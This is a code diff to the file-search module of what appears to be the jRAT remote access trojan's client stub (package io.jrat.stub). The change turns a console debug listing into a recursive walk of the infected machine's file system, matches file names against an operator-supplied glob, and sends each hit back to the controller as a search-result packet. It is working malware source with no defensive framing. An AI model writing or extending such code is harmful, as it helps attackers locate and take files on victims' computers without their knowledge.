@@ -5,10 +5,16 @@ import io.jrat.stub.packets.outgoing.Packet37SearchResult;
 import java.io.File;
 import java.nio.file.DirectoryStream;
 import java.nio.file.FileSystems;
+import java.nio.file.FileVisitResult;
 import java.nio.file.Files;
 import java.nio.file.Path;
+import java.nio.file.FileVisitor;
+import java.nio.file.attribute.BasicFileAttributes;
+import java.nio.file.PathMatcher;
+import io.jrat.common.Logger;
+import java.io.IOException;
 
-public class FileSearch extends Thread {
+public class FileSearch extends Thread implements FileVisitor<Path> {
 
 	private static boolean running;
 
@@ -16,33 +22,30 @@ public class FileSearch extends Thread {
 	private String searchRoot;
 	private String name;
 	private boolean dir;
+	private PathMatcher matcher;
 
-	public FileSearch(Connection con, String searchRoot, String name, boolean dir) {
+	public FileSearch(Connection con, String searchRoot, String pattern, boolean dir) {
 		this.con = con;
 		this.searchRoot = searchRoot;
-		this.name = name;
+		this.name = pattern;
 		this.dir = dir;
+
+		matcher = FileSystems.getDefault().getPathMatcher("glob:" + pattern);
 	}
 
 	public void run() {
 		running = true;
 		try {
-			search(searchRoot);
+			search(name);
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
 	}
 
 	public void search(String dir) throws Exception {
-		Path path = FileSystems.getDefault().getPath(dir);
+		Path path = FileSystems.getDefault().getPath(searchRoot);
 
-		DirectoryStream<Path> stream = Files.newDirectoryStream(path, "*.{txt,doc,pdf,ppt}" );
-		for (Path sub : stream) {
-			//con.addToSendQueue(new Packet37SearchResult(f.getParent(), f.getName(), f.isDirectory()));
-
-			System.out.println(sub.getFileName());
-		}
-		stream.close();
+		Files.walkFileTree(path, this);
 	}
 	
 	public static boolean isRunning() {
@@ -56,4 +59,27 @@ public class FileSearch extends Thread {
 		running = false;
 	}
 
+	public FileVisitResult visitFile(Path path, BasicFileAttributes attributes) {
+		String parent = path.toFile().getParent();
+		String name = path.toFile().getName();
+		boolean dir = path.toFile().isDirectory();
+
+		if (matcher.matches(path.getFileName())) {
+			con.addToSendQueue(new Packet37SearchResult(parent, name, dir));
+		}
+
+		return FileVisitResult.CONTINUE;
+	}
+
+	public FileVisitResult preVisitDirectory(Path path, BasicFileAttributes attributes) {
+		return FileVisitResult.CONTINUE;
+	}
+
+	public FileVisitResult visitFileFailed(Path path, IOException ex) {
+		return FileVisitResult.CONTINUE;
+	}
+
+	public FileVisitResult postVisitDirectory(Path path, IOException ex) {
+		return FileVisitResult.CONTINUE;
+	}
 }
